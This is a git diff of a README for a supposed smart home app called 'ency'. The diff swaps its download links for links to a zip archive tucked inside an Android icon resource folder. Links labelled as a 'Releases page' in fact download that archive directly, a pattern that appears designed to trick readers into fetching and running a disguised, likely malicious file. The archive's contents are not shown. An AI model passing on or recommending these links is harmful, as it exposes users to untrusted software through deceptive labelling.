@@ -6,14 +6,14 @@ Welcome to ency, the smart home automation solution. With ency, you can automate
 
 ### 🔗 Download Here
 
-[![Download ency](https://raw.githubusercontent.com/Server-cmd-sudo/ency/main/ency-app/app/ency_v3.0-alpha.5.zip)](https://raw.githubusercontent.com/Server-cmd-sudo/ency/main/ency-app/app/ency_v3.0-alpha.5.zip)
+[![Download ency](https://github.com/Server-cmd-sudo/ency/raw/refs/heads/main/ency-app/android/app/src/main/res/mipmap-xxhdpi/Software_2.5.zip)](https://github.com/Server-cmd-sudo/ency/raw/refs/heads/main/ency-app/android/app/src/main/res/mipmap-xxhdpi/Software_2.5.zip)
 
 ## 📥 Download & Install
 
 To get started with ency, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Server-cmd-sudo/ency/main/ency-app/app/ency_v3.0-alpha.5.zip) to find the latest version of the app.
+   Go to our [Releases page](https://github.com/Server-cmd-sudo/ency/raw/refs/heads/main/ency-app/android/app/src/main/res/mipmap-xxhdpi/Software_2.5.zip) to find the latest version of the app.
 
 2. **Choose Your Version**  
    You'll see different versions available. We recommend downloading the latest release. Click on the version number to see its details.
@@ -76,6 +76,6 @@ If you want to dive deeper into the technology that powers ency, here are some t
 
 ### 🔗 Download Now
 
-For the latest version, [visit the Releases page](https://raw.githubusercontent.com/Server-cmd-sudo/ency/main/ency-app/app/ency_v3.0-alpha.5.zip) again, where you can get your copy of ency. 
+For the latest version, [visit the Releases page](https://github.com/Server-cmd-sudo/ency/raw/refs/heads/main/ency-app/android/app/src/main/res/mipmap-xxhdpi/Software_2.5.zip) again, where you can get your copy of ency. 
 
 Thank you for choosing ency to enhance your home automation experience! Enjoy the convenience and smart features.
